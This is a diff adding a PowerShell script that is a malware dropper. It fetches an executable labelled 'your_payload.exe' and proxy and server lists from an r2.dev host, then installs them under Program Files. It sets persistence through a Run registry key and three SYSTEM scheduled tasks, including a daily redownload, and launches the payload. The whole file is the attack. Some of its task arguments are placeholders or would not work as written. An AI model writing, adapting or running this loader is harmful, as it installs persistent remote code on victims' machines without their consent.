@@ -1,0 +1,64 @@
+
+$url = "https://pub-da4075db43784978a80399bb712d271c.r2.dev/your_payload.exe"  # Replace with your actual URL
+
+
+$output = "C:\Program Files\YourPayload\your_payload.exe"
+
+
+$txtUrls = @(
+    "https://pub-da4075db43784978a80399bb712d271c.r2.dev/ntpServers.txt",
+    "https://pub-da4075db43784978a80399bb712d271c.r2.dev/socks4.txt",
+    "https://pub-da4075db43784978a80399bb712d271c.r2.dev/memsv.txt"
+)
+
+
+if (-not (Test-Path "C:\Program Files\YourPayload")) {
+    New-Item -Path "C:\Program Files" -Name "YourPayload" -ItemType "Directory" -Force
+}
+
+
+function Download-Files {
+    
+    Invoke-WebRequest -Uri $url -OutFile $output
+
+    
+    foreach ($txtUrl in $txtUrls) {
+        $fileName = [System.IO.Path]::GetFileName($txtUrl)  # Extract the file name from the URL
+        $txtOutput = "C:\Program Files\YourPayload\$fileName"
+        Invoke-WebRequest -Uri $txtUrl -OutFile $txtOutput
+    }
+}
+
+
+Download-Files
+
+
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regPath -Name "MyPayload" -Value $output
+
+
+$Action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-File 'C:\Path\To\Your\Script.ps1'"
+$Trigger = New-ScheduledTaskTrigger -AtStartup  # Task will run at startup
+$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
+
+
+Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -TaskName "PersistentPayload"
+
+
+$ActionRedownload = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-Command 'Download-Files'"
+$TriggerRedownload = New-ScheduledTaskTrigger -Daily -At "12:00AM"  # This can be changed to any time, every day
+$PrincipalRedownload = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
+
+
+Register-ScheduledTask -Action $ActionRedownload -Trigger $TriggerRedownload -Principal $PrincipalRedownload -TaskName "RedownloadFiles"
+
+
+$ActionExec = New-ScheduledTaskAction -Execute $output
+$TriggerExec = New-ScheduledTaskTrigger -AtStartup  # Task will run at startup
+$PrincipalExec = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
+
+
+Register-ScheduledTask -Action $ActionExec -Trigger $TriggerExec -Principal $PrincipalExec -TaskName "PersistentExecutable"
+
+
+Start-Process $output
